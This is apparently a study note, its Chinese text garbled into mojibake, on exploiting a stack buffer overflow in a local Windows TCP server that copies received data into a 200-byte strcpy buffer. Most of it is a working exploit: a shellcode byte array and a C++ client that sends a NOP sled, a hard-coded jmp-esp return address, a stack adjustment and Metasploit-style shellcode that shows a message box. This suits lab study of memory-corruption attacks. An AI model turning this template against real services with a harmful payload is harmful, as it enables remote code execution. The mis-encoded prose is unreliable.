å¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ª tcpåè®®çš„æœåŠ¡å™¨

| APIåç§°     | APIåŠŸèƒ½                     |
| ----------- | --------------------------- |
| WSAStartup  | åˆå§‹åŒ– WSAStartupå¥—æ¥å­—åº“   |
| socket      | åˆ›å»º SOCKET                 |
| bind        | ç»‘å®šç«¯å£                    |
| listen      | ç›‘å¬                        |
| accept      | æ¥å—è¿æ¥                    |
| recv        | æ¥æ”¶æ•°æ®                    |
| closesocket | å…³é—­socket                  |
| WSACleanup  | ååˆå§‹åŒ– WSAStartupå¥—æ¥å­—åº“ |

åè®®ä¸º:    IPPROTO_IP          SOCK_STREAM (æ•°æ®æµ)  

![image.png](notesimg/1659371817045-6565e09b-80b3-4dcc-8146-573dd91d7fa4.png)



![image.png](notesimg/1659371880753-bbd47d08-cf97-435b-bd84-ff6c639b4431.png)



![image.png](notesimg/1659371987282-15803362-4cea-4bed-891b-898110c230da.png)



![image.png](notesimg/1659372000621-db6e25c1-92f4-4a6c-a33c-94ca8b073835.png)



å¯æ¥æ”¶çš„åŒ…æ•°æ®å¤§å°ä¸º 512 å­—èŠ‚

ç¼“å†²åŒºåœ°å€: 0019FBA4

![image.png](notesimg/1659375370535-754f8415-9af2-475f-b65b-ee7770ac9412.png)



![image.png](notesimg/1659375328229-de03e861-2d0c-4409-8074-836f43eac324.png)





srtcpy   ç¼“å†²åŒºå¤§å° 200å­—èŠ‚

![image.png](notesimg/1659457586605-0150d71c-2c1f-4418-b064-ae42be14c708.png)

å‘é€ç«¯ä»£ç 

```
    unsigned char szBuf[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,

    0x12, 0x45, 0xFA, 0x7F,

    0x83,0xEC,0x40,
    0xD9, 0xEB, 0x9B, 0xD9, 0x74, 0x24, 0xF4, 0x31, 0xD2, 0xB2, 0x77, 0x31, 0xC9, 0x64, 0x8B, 0x71,
    0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38,
    0x4F, 0x18, 0x75, 0xF3, 0x59, 0x01, 0xD1, 0xFF, 0xE1, 0x60, 0x8B, 0x6C, 0x24, 0x24, 0x8B, 0x45,
    0x3C, 0x8B, 0x54, 0x28, 0x78, 0x01, 0xEA, 0x8B, 0x4A, 0x18, 0x8B, 0x5A, 0x20, 0x01, 0xEB, 0xE3,
    0x34, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xEE, 0x31, 0xFF, 0x31, 0xC0, 0xFC, 0xAC, 0x84, 0xC0, 0x74,
    0x07, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xEB, 0xF4, 0x3B, 0x7C, 0x24, 0x28, 0x75, 0xE1, 0x8B, 0x5A,
    0x24, 0x01, 0xEB, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x5A, 0x1C, 0x01, 0xEB, 0x8B, 0x04, 0x8B, 0x01,
    0xE8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xB2, 0x08, 0x29, 0xD4, 0x89, 0xE5, 0x89, 0xC2, 0x68,
    0x8E, 0x4E, 0x0E, 0xEC, 0x52, 0xE8, 0x9F, 0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x04, 0xBB, 0x7E, 0xD8,
    0xE2, 0x73, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x8E, 0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x08, 0x68, 0x6C,
    0x6C, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2E, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xDB, 0x88,
    0x5C, 0x24, 0x0A, 0x89, 0xE6, 0x56, 0xFF, 0x55, 0x04, 0x89, 0xC2, 0x50, 0xBB, 0xA8, 0xA2, 0x4D,
    0xBC, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x5F, 0xFF, 0xFF, 0xFF, 0x68, 0x6F, 0x78, 0x58, 0x20, 0x68,
    0x61, 0x67, 0x65, 0x42, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x31, 0xDB, 0x88, 0x5C, 0x24, 0x0A, 0x89,
    0xE3, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x4D, 0x53, 0x46, 0x21, 0x68, 0x72, 0x6F, 0x6D, 0x20,
    0x68, 0x6F, 0x2C, 0x20, 0x66, 0x68, 0x48, 0x65, 0x6C, 0x6C, 0x31, 0xC9, 0x88, 0x4C, 0x24, 0x10,
    0x89, 0xE1, 0x31, 0xD2, 0x52, 0x53, 0x51, 0x52, 0xFF, 0xD0, 0x31, 0xC0, 0x50, 0xFF, 0x55, 0x08
    };
```

å®¢æˆ·ç«¯ä»£ç 

```c++
#define _WINSOCK_DEPRECATED_NO_WARNINGS 

#include <iostream>
#include <string>

using namespace std;

#include <winsock2.h>
#include <windows.h>



int main()
{
    //åˆ›å»ºsocket
    SOCKET sockClient = socket(AF_INET,
        SOCK_STREAM, //æ•°æ®æµ
        IPPROTO_IP   //åè®®
    );
    if (sockClient == INVALID_SOCKET)
    {
        cout << "socket failed" << endl;
        return 0;
    }

    //è¿æ¥æœåŠ¡å™¨
    sockaddr_in si;
    si.sin_family = AF_INET;
    si.sin_port = htons(0x1E61);
    si.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");

    int nRet = connect(sockClient, (sockaddr*)&si, sizeof(si));
    if (nRet == SOCKET_ERROR)
    {
        cout << "connect failed" << endl;
        return 0;
    }

    while (true)
    {
        //æ”¶å‘æ•°æ®
        char szSend[MAXBYTE] = { 0x592 };
        cin >> szSend;

        //è¾“å…¥  exit  é€€å‡ºå¾ªç¯
        cin.getline(szSend, sizeof(szSend));
        if (string("exit") == szSend)
        {
            cout << "exit process" << endl;
            closesocket(sockClient);
            return 0;
        }


        //å‘é€çš„ç•¸å½¢åŒ…æ•°æ®
        char szData[] = {
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
               
                //è·³æ¿
                0x12, 0x45, 0xFA, 0x7F,

                 //æŠ¬æ ˆ
                0x83,0xEC,0x40,
            
                 //shellcode
                0xD9, 0xEB, 0x9B, 0xD9, 0x74, 0x24, 0xF4, 0x31, 0xD2, 0xB2, 0x77, 0x31, 0xC9, 0x64, 0x8B, 0x71,
                0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38,
                0x4F, 0x18, 0x75, 0xF3, 0x59, 0x01, 0xD1, 0xFF, 0xE1, 0x60, 0x8B, 0x6C, 0x24, 0x24, 0x8B, 0x45,
                0x3C, 0x8B, 0x54, 0x28, 0x78, 0x01, 0xEA, 0x8B, 0x4A, 0x18, 0x8B, 0x5A, 0x20, 0x01, 0xEB, 0xE3,
                0x34, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xEE, 0x31, 0xFF, 0x31, 0xC0, 0xFC, 0xAC, 0x84, 0xC0, 0x74,
                0x07, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xEB, 0xF4, 0x3B, 0x7C, 0x24, 0x28, 0x75, 0xE1, 0x8B, 0x5A,
                0x24, 0x01, 0xEB, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x5A, 0x1C, 0x01, 0xEB, 0x8B, 0x04, 0x8B, 0x01,
                0xE8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xB2, 0x08, 0x29, 0xD4, 0x89, 0xE5, 0x89, 0xC2, 0x68,
                0x8E, 0x4E, 0x0E, 0xEC, 0x52, 0xE8, 0x9F, 0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x04, 0xBB, 0x7E, 0xD8,
                0xE2, 0x73, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x8E, 0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x08, 0x68, 0x6C,
                0x6C, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2E, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xDB, 0x88,
                0x5C, 0x24, 0x0A, 0x89, 0xE6, 0x56, 0xFF, 0x55, 0x04, 0x89, 0xC2, 0x50, 0xBB, 0xA8, 0xA2, 0x4D,
                0xBC, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x5F, 0xFF, 0xFF, 0xFF, 0x68, 0x6F, 0x78, 0x58, 0x20, 0x68,
                0x61, 0x67, 0x65, 0x42, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x31, 0xDB, 0x88, 0x5C, 0x24, 0x0A, 0x89,
                0xE3, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x4D, 0x53, 0x46, 0x21, 0x68, 0x72, 0x6F, 0x6D, 0x20,
                0x68, 0x6F, 0x2C, 0x20, 0x66, 0x68, 0x48, 0x65, 0x6C, 0x6C, 0x31, 0xC9, 0x88, 0x4C, 0x24, 0x10,
                0x89, 0xE1, 0x31, 0xD2, 0x52, 0x53, 0x51, 0x52, 0xFF, 0xD0, 0x31, 0xC0, 0x50, 0xFF, 0x55, 0x08
        };
   
        nRet = send(sockClient, szData, sizeof(szData), 0);
        if (nRet == SOCKET_ERROR)
        {
            cout << "send failed" << endl;
            return 0;
        }
#if 0

        char szBuff[MAXBYTE] = {};
        nRet = recv(sockClient, szBuff, sizeof(szBuff), 0);
        if (nRet == 0 || nRet == SOCKET_ERROR)
        {
            cout << "recv failed" << endl;
            return 0;
        }
        cout << szBuff << endl;
#endif // 0   
    }


}
```

